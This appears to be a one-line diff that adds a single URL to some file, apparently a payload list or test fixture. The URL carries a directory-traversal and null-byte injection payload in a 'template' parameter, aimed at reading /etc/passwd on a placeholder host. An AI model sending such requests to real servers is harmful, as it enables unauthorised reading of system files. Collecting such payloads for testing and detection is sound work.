@@ -1,0 +1,1 @@
+http://www.example.com/detail.php?template=../../../../../../etc/passwd%00
